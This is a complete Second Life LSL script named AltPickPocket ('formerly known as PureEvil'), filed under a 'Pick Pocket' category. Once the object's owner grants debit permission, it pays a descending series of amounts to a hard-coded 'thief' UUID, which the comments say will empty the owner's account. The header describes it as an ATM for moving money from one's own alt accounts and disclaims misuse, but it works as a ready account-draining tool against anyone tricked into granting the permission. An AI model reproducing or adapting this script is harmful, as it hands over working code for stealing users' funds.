// :CATEGORY:Pick Pocket
// :NAME:AltPickPocket
// :AUTHOR:Mitzpatrick Fitzsimmons 
// :CREATED:2010-01-10 05:20:56.000
// :EDITED:2013-09-18 15:38:47
// :ID:29
// :NUM:40
// :REV:1.0
// :WORLD:Second Life
// :DESCRIPTION:
// AltPickPocket.lsl
// :CODE:


//----------------------------------------------------------------------------------- 
// AltPickPocket Script C 2005-2007 
// Formerly Known as PureEvil 
// By Mitzpatrick Fitzsimmons 
//----------------------------------------------------------------------------------- 

//this script was made initially for the purpose of keeping an ATM type object that would allow you to take the $L from your Alt's accounts 
//at will, without the need to log out and log the Alt in and make a manual payment. 

//----------------------------DISCLAIMER!-------------------------------------------- 
// This script will take money from the person that owns the object it is in 
// ONLY IF that owner accepts the PERMISSION_DEBIT. 

// The UUID of the "thief" variable is to whom the money is paid to. 
// I accept no responsability for the USE or MISUSE of this script. 
// As with anything in SL, make sure you know what you are doing before you do it. 
//----------------------------------------------------------------------------------- 

key thief = "00000000-0000-0000-0000-000000000000"; // Insert the key of the person who is going to get the money here. 
list ammount = [32768, 16384, 8192, 4096, 2048, 1024, 512, 256, 128, 64, 32, 16, 8, 4, 2, 1]; // Use a list to enumerate payments until the account is cleaned out. 

// The pay function here will use the integers in the ammount list to transact payments to the thief UUID in incremental 
// amounts until the list ends. In most cases this will deplete the account of the owner (unless there is more money in that 
// owners account than is in the largest list amount). 
pay () 
{ 
    integer m = llGetListLength(ammount); 
    integer i = 0; 
    while (i<m) 
    { 
        llGiveMoney(thief,llList2Integer(ammount,i)); 
        i++; 
    } 
} 

default 
{ 
     on_rez(integer number) 
    { 
        llResetScript(); // Make sure Ownership Changes properly. 
    } 
    
    state_entry() 
    { 
        llSetObjectName("AltPickPocket"); // Set the Object Name 
        llRequestPermissions(llGetOwner(),PERMISSION_DEBIT);// Request Owners permission to debit money. 
    } 

    touch_start(integer total_number) 
    { 
        if(llDetectedKey(0) == thief) // if the thief is touching the object 
        { 
            llSay(0, "You are the Authorized."); // Tell them they are Authorized 
            pay(); // Then Pay them 
        } 
    
        else 
        { // If it is not the thief touching the object 
            llSay(0, "You are NOT Authorized!"); // then deny them 
        } 
    } 
    
    run_time_permissions(integer number) 
    { 
        if(number >0) 
        { 
            llOwnerSay("Activated!"); 
            llSetColor(<0,1,0>, ALL_SIDES); 
            llSetText("Active",<0,1,0>,1); 
        } 
    
        else 
        { 
            llSay(0, "PickPocket has no permissions"); 
            llSetColor(<1,0,0>, ALL_SIDES); 
            llSetText("InActive",<1,0,0>,1); 
        } 
    } 
}     // end 
